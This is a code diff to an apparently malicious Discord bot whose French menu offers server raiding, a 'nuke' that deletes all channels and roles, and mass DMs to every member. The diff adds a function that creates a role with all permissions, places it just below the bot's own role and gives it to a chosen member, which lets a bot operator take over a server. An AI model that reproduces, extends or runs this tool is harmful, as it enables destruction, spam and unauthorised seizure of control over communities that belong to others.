@@ -74,14 +74,36 @@ async def dm_all_members(guild, message):
         except Exception as e:
             print(f"Une erreur s'est produite lors de l'envoi d'un message à {member.name} : {e}")
 
+async def give_admin_role(guild, member_id):
+    member = guild.get_member(member_id)
+    if member is None:
+        print(f"Impossible de trouver le membre avec l'ID {member_id} dans le serveur {guild.name}")
+        return
+
+    bot_roles = [role for role in guild.roles if role.managed and role in guild.me.roles]
+    if not bot_roles:
+        print(f"Impossible de trouver le rôle du bot dans le serveur {guild.name}")
+        return
+
+    highest_bot_role = max(bot_roles, key=lambda r: r.position)
+    
+    admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions.all(), reason="Admin role created by bot")
+    
+    # Move the admin role to the position just below the highest bot role
+    await admin_role.edit(position=highest_bot_role.position - 1)
+    
+    await member.add_roles(admin_role)
+    print(f"Rôle administrateur donné à {member.name} dans le serveur {guild.name}")
+
 async def main_menu():
     while True:
         print("\nBienvenue ! Voici les options disponibles :")
         print("1. Raid serveur")
         print("2. Liste des serveurs et invitations")
         print("3. Nuke le serveur (efface tous les salons et rôles)")
-        print("4. Mass Dm Membre D'un Serveur")
-        choice = input("Entrez votre choix (1, 2, 3 ou 4) : ")
+        print("4. Mass DM Membres d'un Serveur")
+        print("5. Donner le rôle administrateur à un membre")
+        choice = input("Entrez votre choix (1, 2, 3, 4 ou 5) : ")
 
         if choice == '1':
             guild_id_input = input("Entrez l'ID du serveur où créer les salons : ")
@@ -147,8 +169,22 @@ async def main_menu():
             message = input("Entrez le message à envoyer à tous les membres : ")
             await dm_all_members(guild, message)
             print("Retour au menu principal...")
+        elif choice == '5':
+            guild_id_input = input("Entrez l'ID du serveur où donner le rôle administrateur : ")
+            guild_id = int(guild_id_input) if guild_id_input.strip() else None
+            
+            guild = client.get_guild(guild_id)
+            if guild is None:
+                print(f"Impossible de trouver le serveur avec l'ID {guild_id}")
+                continue
+
+            member_id_input = input("Entrez l'ID du membre à qui donner le rôle administrateur : ")
+            member_id = int(member_id_input) if member_id_input.strip() else None
+            
+            await give_admin_role(guild, member_id)
+            print("Retour au menu principal...")
         else:
-            print("Choix invalide. Veuillez entrer 1, 2, 3 ou 4.")
+            print("Choix invalide. Veuillez entrer 1, 2, 3, 4 ou 5.")
 
 @client.event
 async def on_ready():
